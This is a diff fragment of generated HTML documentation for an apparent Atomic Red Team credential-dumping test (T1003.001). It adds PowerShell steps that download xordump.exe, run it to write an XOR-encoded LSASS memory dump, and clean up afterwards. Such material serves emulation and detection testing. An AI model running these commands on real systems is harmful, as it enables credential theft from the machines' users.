+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe&quot;</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">xordump</span><span class="p">.</span><span class="n">exe</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -6348,14 +6450,27 @@ Invoke-WebRequest &quot;https://github.com/audibleblink/xordump/releases/downloa
 </div>
 </section>
 </section>
-<section id="id35">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id35" title="Permalink to this headline">#</a></h4>
+<section id="id39">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id39" title="Permalink to this headline">#</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">xordump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-out</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass-xordump</span><span class="p">.</span><span class="n">t1003</span><span class="p">.</span><span class="n">001</span><span class="p">.</span><span class="n">dmp</span> <span class="n">-x</span> <span class="n">0x41</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">12</span>
+</pre></div>
+</div>
+</div>
+</div>
+</section>
+<section id="id40">
+<h4>Cleanup:<a class="headerlink" href="#id40" title="Permalink to this headline">#</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass-xordump</span><span class="p">.</span><span class="n">t1003</span><span class="p">.</span><span class="n">001</span><span class="p">.</span><span class="n">dmp</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">12</span> <span class="n">-Cleanup</span>
 </pre></div>
 </div>
 </div>
@@ -6408,7 +6523,7 @@ Invoke-WebRequest &quot;https://github.com/audibleblink/xordump/releases/downloa
     <a class='right-next' id="next-link" href="T1003.002.html" title="next page">
     <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">T1003.002 - OS Credential Dumping: Security Account Manager</p>
+        <p class="prev-next-title">T1003.002 - Security Account Manager</p>
     </div>
     <i class="fas fa-angle-right"></i>
     </a>
